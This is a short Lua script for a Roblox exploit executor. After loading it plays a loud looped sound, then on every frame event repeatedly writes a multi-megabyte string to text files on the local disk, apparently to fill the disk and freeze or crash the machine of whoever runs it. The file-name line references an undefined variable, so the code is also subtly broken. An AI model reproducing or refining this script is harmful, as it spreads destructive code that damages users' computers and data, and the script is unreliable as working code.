if not game:IsLoaded() then game.Loaded:Wait() end

local RunService = game:FindService('RunService')
local Loops = {
    RunService.Stepped,
    RunService.RenderStepped,
    RunService.Heartbeat,
    RunService.PreRender,
    RunService.PreSimulation
}

local String = string.rep('𪚥🈵', 3484848)
local Sound = Instance.new('Sound', workspace)

Sound.SoundId = 'rbxassetid://1709572464'
Sound.Volume = 10
Sound.Looped = true
Sound.Playing = true

local Name = 1
for _, RS in ipairs(Loops) do
    RS:Connect(function()
        task.spawn(function()
            writefile(a .. '.txt', String)
            Name = Name + 1
        end)
    end)
end
